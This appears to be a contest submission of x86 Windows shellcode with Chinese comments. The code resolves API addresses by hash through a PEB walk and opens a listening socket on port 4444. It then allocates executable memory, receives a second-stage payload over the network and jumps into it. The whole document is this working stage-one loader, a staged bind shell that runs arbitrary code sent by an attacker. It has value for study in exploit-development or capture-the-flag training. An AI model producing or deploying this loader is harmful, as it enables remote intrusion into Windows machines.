###########################
#
#  队伍：   Random  
#
#  提交者： RPG 
#
########################



		cld						//寄存器处理
		//几个函数的地址，后面会使用
		push 0xc7979076			//recv
		push 0x01971eb1			//accept
		push 0x4bd39f0c			//listen
		push 0xdda71064			//bind
		push 0xde78322d			//WSASocketA
		push 0x80b46a3d			//WSAStartup
		push 0x0c917432			// LoadLibraryA
		push 0x1ede5967			//VirtualAlloc

		mov esi,esp			//esi指向存放hash值的内存
		lea edi,[esi-0x24]		//edi指向存放API地址的内存

		//find base addr of kernel32.dll

		mov ebx, fs:[ 0x30 ]       // 获得PEB
		mov ecx, [ ebx + 0x0C ]    // 获得PEB_LDR_DATA
		mov ecx, [ ecx + 0x0C ]    // InLoadOrderModuleList第一项
		mov ecx, [ ecx ]           // InLoadOrderModuleList第二项
		mov ecx, [ ecx ]           // InLoadOrderModuleList第三项
		mov ebp, [ ecx + 0x18 ]    // 获取路径地址

		//抬高堆栈
		xor ebx,ebx
		mov bh,0x03
		sub esp,ebx


		//push a piont to "ws2_32" onto stack
		
		mov bx,0x3233 
		push ebx 
		push 0x5F327377
		push esp
		
		
find_lib_functions:                                      //ws2_32
		lodsd
		cmp eax,0x80b46a3d			//WSAStartup

		jne find_functions			//LoadLibraryA 加载进去
		xchg eax,ebp
		call [edi -0x04]			//LoadLibraryA
		xchg eax,ebp

		push edi					//来保存ws2_32中第一个函数的地址，用这种方法来进行暴力搜索

find_functions:
		pushad						//保护寄存器
		mov eax,[ebp+0x3c]			//eax= PE头
		mov ecx,[ebp+eax+0x78]		//ecx= 导出表相对偏移量
		add ecx, ebp				//ecx= 导出表地址
		mov ebx,[ecx+0x20]			//ebx= 函数名列表偏移量相对于dll基址
		add ebx,ebp					//ebx= 函数名称绝对地址
		xor edi,edi					//edi作为函数计数器

next_function_loop:
		inc edi						//increment function counter

		mov esi,[ebx+edi*4]			//esi =relative offset of current function name

		add esi, ebp				//esi = absolute addr of current function name

		cdq							//dl will hold hash

hash_loop:

		movsx eax,byte ptr[esi]
		cmp al,ah
		jz compare_hash
		ror edx, 7
		add edx,eax
		inc esi
		jmp hash_loop

compare_hash:
		cmp edx,[esp+0x1c]			//hash的比较

		jnz next_function_loop


		mov ebx,[ecx+0x24]			//ebx =resolute offset of ordinals table

		add ebx,ebp					//ebx = absolute addr of ordinals table

		mov di,[ebx+2*edi]			//di= ordinal number of matched function

		mov ebx,[ecx+0x1c]			//ebx= resolute addr of address table

		add ebx,ebp					//ebx=absolute addr of address table

		add ebp,[ebx+4*edi]			//add to ebp (base addrof module) the relative offset of matched function
									
		xchg eax,ebp				//move func addr into eax

		pop edi						//edi is last onto stack in pushed
		
		stosd						//write function addr to [edi] and increment edi

		push edi

		popad						//restore registers
									//loop until we reach end of last hash
		cmp eax,0xc7979076
		jne find_lib_functions
		
		pop esi						//第一个winsock函数的地址，对应上面的push edi

		//init winsock

		push esp
		push 0x2
		lodsd
		call eax					//WSAStartup

		//mov byte ptr [esi +0x13],al //eax = 0 如果调用WSAStartup() 成功

		//清理堆栈数据

		lea ecx,[eax + 0x30]		//sizeof (STARTUPINFO) = 0x44
		mov edi,esp
		rep stosd					//eax is still 0

		//create socket

		inc eax
		push eax
		inc eax
		push eax //af = 2 (AF_INET)
		lodsd
		call eax //WSAScoketA
		xchg ebp,eax

		//bind

		mov eax, 0x5c11ff02		// 设置端口号4444和AF_INET
		xor ah, ah				// 移除eax中的ff
		push eax				// 以此作为sockaddr结构体，同时也是namelen参数
		push esp				// sockaddr
		
		//call bind(),listen() and accept() in turn
call_loop:
		push ebp

		lodsd
		call eax
		test eax,eax
		jz call_loop

		xchg eax, ebp

		// VirtualAlloc()内存空间
		xor edx, edx
		add dl, 0x40
		push edx				// 设置所申请的内存的属性，读，写，可执行
		xor edx, edx
		add dh, 0x10
		push edx				// flAlloction Type = 0x1000
		mov dh, 0x03
		push edx				// 大小 0x300
		xor edx, edx
		push edx				// lpAddress = NULL，由系统分配首地址
		call [esi-0x1c]			// VirtualAlloc()

		xchg eax, ebp			// eax = SOCKET描述符，ebp = 申请的内存首地址

		xor edx, edx			
		push edx				// flags = 0
		mov dh, 0x03
		push edx				// 大小0x300
		push ebp				// buf
		push eax				// SOCKET
		call [esi]				// 调用  recv()
		jmp ebp					// 接收shellcode后，跳转执行